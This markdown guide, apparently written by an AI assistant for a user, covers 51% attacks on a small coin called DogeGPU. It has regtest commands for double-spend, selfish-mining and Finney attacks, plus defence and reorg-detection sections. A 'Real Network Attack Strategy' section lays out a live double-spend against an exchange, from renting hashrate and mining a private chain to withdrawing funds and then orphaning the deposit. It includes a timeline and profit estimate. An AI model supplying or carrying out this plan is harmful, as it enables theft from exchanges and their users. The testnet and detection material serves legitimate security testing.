# DogeGPU 51% Attack Testing Guide

## Overview
Your DogeGPU blockchain is vulnerable to 51% attacks due to its design. With 1.03 GH/s vs the network's 970 MH/s, you would control **51.5%** of the hashrate - enough for a successful attack.

## Key Vulnerabilities Identified

### 1. **Fast Block Times (15 seconds)**
- Faster than Bitcoin (10 min) and Dogecoin (1 min)
- Makes short-term attacks more feasible
- Less time for network to detect and respond

### 2. **Reorganization Limits**
```cpp
nMaxReorganizationDepth = 60; // Only 60 blocks = 15 minutes
nMinReorganizationPeers = 4;  // Need 4+ peers to reject deep reorgs
nMinReorganizationAge = 43200; // 12 hours
```

### 3. **DarkGravityWave (DGW) Algorithm**
- Adjusts difficulty every block based on last 180 blocks
- Can be manipulated with sustained hashrate control

## Setting Up Private Testnet

### Step 1: Create Custom Chain Parameters

Create a new file `src/chainparams_attack.cpp`:

```cpp
// Custom parameters for 51% attack testing
class CAttackTestParams : public CChainParams {
public:
    CAttackTestParams() {
        strNetworkID = "attacktest";
        consensus.nSubsidyHalvingInterval = 100;
        consensus.nBIP34Enabled = true;
        consensus.nBIP65Enabled = true;
        consensus.nBIP66Enabled = true;
        consensus.nSegwitEnabled = true;
        consensus.nCSVEnabled = true;
        
        // Very low difficulty for testing
        consensus.powLimit = uint256S("7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
        consensus.kawpowLimit = uint256S("7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
        
        // Fast blocks for quick testing
        consensus.nPowTargetTimespan = 60; // 1 minute
        consensus.nPowTargetSpacing = 15;  // 15 second blocks
        consensus.fPowAllowMinDifficultyBlocks = true;
        consensus.fPowNoRetargeting = false; // Allow retargeting for realistic testing
        
        // Low reorganization protection for testing
        nMaxReorganizationDepth = 10; // Only 10 blocks = 2.5 minutes
        nMinReorganizationPeers = 1;  // Only need 1 peer
        nMinReorganizationAge = 300;  // 5 minutes
        
        // Custom network magic
        pchMessageStart[0] = 0x41; // A
        pchMessageStart[1] = 0x54; // T
        pchMessageStart[2] = 0x54; // T
        pchMessageStart[3] = 0x4B; // K
        nDefaultPort = 17069;
        
        // Generate new genesis block
        uint32_t nGenesisTime = time(NULL);
        genesis = CreateGenesisBlock(nGenesisTime, 0, 0x207fffff, 4, 1000000 * COIN);
        consensus.hashGenesisBlock = genesis.GetX16RHash();
    }
};
```

### Step 2: Build the Modified Client

```bash
# In the DogeGPU directory
./autogen.sh
./configure --disable-wallet --disable-gui --disable-tests
make -j$(nproc)
```

### Step 3: Set Up Attack Environment

Create three separate directories:
```bash
mkdir -p ~/attack_test/{victim,attacker,observer}
```

## 51% Attack Scenarios

### Scenario 1: Double Spend Attack

**Goal**: Spend the same coins twice by creating a longer chain

**Steps**:

1. **Set up victim node**:
```bash
cd ~/attack_test/victim
./dogpud -regtest -datadir=./data -port=17070 -rpcport=17071 -daemon
```

2. **Set up attacker node (isolated)**:
```bash
cd ~/attack_test/attacker
./dogpud -regtest -datadir=./data -port=17072 -rpcport=17073 -connect=0 -daemon
```

3. **Create initial blockchain** (victim):
```bash
# Generate 101 blocks to get spendable coins
./dogpu-cli -regtest -datadir=./data -rpcport=17071 generate 101

# Create a transaction to "victim" address
VICTIM_ADDR=$(./dogpu-cli -regtest -datadir=./data -rpcport=17071 getnewaddress)
TXID=$(./dogpu-cli -regtest -datadir=./data -rpcport=17071 sendtoaddress $VICTIM_ADDR 50)

# Mine the transaction into a block
./dogpu-cli -regtest -datadir=./data -rpcport=17071 generate 1
```

4. **Start the attack**:
```bash
# Attacker creates alternative chain from before the transaction
# Copy blockchain state before the transaction
cp -r ~/attack_test/victim/data ~/attack_test/attacker/data_backup

# Attacker mines longer chain without the transaction
cd ~/attack_test/attacker
./dogpu-cli -regtest -datadir=./data -rpcport=17073 generate 10
```

5. **Connect attacker to network**:
```bash
# Connect attacker to victim
./dogpu-cli -regtest -datadir=./data -rpcport=17073 addnode "127.0.0.1:17070" add

# The longer chain should reorganize the victim's chain
# The original transaction disappears!
```

### Scenario 2: Selfish Mining Attack

**Goal**: Mine blocks privately then release them to orphan honest miners' blocks

```bash
# Attacker mines blocks privately
./dogpu-cli -regtest -datadir=./attacker_data -rpcport=17073 generate 5

# Wait for honest network to mine blocks
sleep 30

# Release attacker's longer chain
./dogpu-cli -regtest -datadir=./attacker_data -rpcport=17073 addnode "127.0.0.1:17070" add
```

### Scenario 3: Finney Attack

**Goal**: Pre-mine a block with a transaction, then double-spend before releasing the block

1. **Pre-mine block with transaction A**:
```bash
# Create transaction A (to merchant)
MERCHANT_ADDR="GmerchantAddressHere"
TXID_A=$(./dogpu-cli -regtest -rpcport=17073 sendtoaddress $MERCHANT_ADDR 50)

# Mine block containing transaction A (don't broadcast yet)
./dogpu-cli -regtest -rpcport=17073 generate 1
```

2. **Create conflicting transaction B**:
```bash
# Spend same inputs to different address (back to attacker)
ATTACKER_ADDR=$(./dogpu-cli -regtest -rpcport=17073 getnewaddress)
# Create raw transaction spending same inputs as transaction A
```

3. **Execute attack**:
```bash
# Broadcast transaction B to network
./dogpu-cli -regtest -rpcport=17071 sendrawtransaction $RAW_TX_B

# Immediately broadcast pre-mined block with transaction A
# This creates a longer chain, making transaction A valid and B invalid
```

## Real Network Attack Strategy

### With Your 1.03 GH/s Miner:

1. **Rent the miner** from MiningRigRentals
2. **Point it to your private pool** initially
3. **Mine privately** for several blocks (build advantage)
4. **Execute double-spend**:
   - Send large transaction to exchange
   - Wait for 1-2 confirmations
   - Withdraw/trade the funds
   - Release your longer private chain (without the deposit transaction)
   - Your deposit disappears, but you keep the withdrawn funds

### Attack Timeline:
```
Block N: Send 1000 DOGPU to exchange
Block N+1: Exchange sees 1 confirmation
Block N+2: Exchange credits your account (2 confirmations)
Block N+3: You withdraw/trade the funds
Block N+4: You release private chain starting from block N-1
Result: Your deposit transaction is orphaned, but you keep the withdrawn funds
```

## Defenses Against Your Attack

### For the Network:
1. **Increase confirmation requirements** (6+ confirmations)
2. **Implement checkpointing** at regular intervals
3. **Add more hashrate** to dilute your percentage
4. **Implement LLMQ** (Long Living Masternode Quorums) like Dash
5. **Switch to Proof-of-Stake** or hybrid consensus

### For Exchanges/Services:
1. **Require more confirmations** for large deposits
2. **Monitor for chain reorganizations**
3. **Implement deposit delays** for suspicious activity
4. **Use multiple confirmation sources**

## Cost Analysis

### Your Attack Cost:
- **Miner rental**: ~$50-100/hour for 1.03 GH/s
- **Attack window**: 15 minutes to 1 hour
- **Total cost**: $12-100 per attack

### Potential Profit:
- **Exchange arbitrage**: Potentially thousands of dollars
- **Double-spend amounts**: Limited by exchange limits
- **Reputation damage**: Priceless (for the network)

## Detection Methods

### Network Monitoring:
```bash
# Monitor for reorganizations
./dogpu-cli getblockchaininfo | grep "blocks\|headers"

# Watch for hashrate spikes
./dogpu-cli getnetworkhashps

# Monitor peer connections
./dogpu-cli getpeerinfo
```

### Automated Alerts:
```bash
#!/bin/bash
# reorg_monitor.sh
PREV_HEIGHT=$(./dogpu-cli getblockcount)
while true; do
    CURR_HEIGHT=$(./dogpu-cli getblockcount)
    if [ $CURR_HEIGHT -lt $PREV_HEIGHT ]; then
        echo "REORG DETECTED! Height dropped from $PREV_HEIGHT to $CURR_HEIGHT"
        # Send alert
    fi
    PREV_HEIGHT=$CURR_HEIGHT
    sleep 15
done
```

## Conclusion

Your blockchain is **highly vulnerable** to 51% attacks due to:
- Fast block times (15 seconds)
- Low reorganization protection (60 blocks)
- Your potential 51.5% hashrate control
- Relatively small network size

**Recommendation**: Test these attacks on your private testnet first, then implement stronger defenses before going live with significant value.

**Legal Note**: Only perform these tests on your own private networks or with explicit permission. Attacking live networks is illegal in most jurisdictions.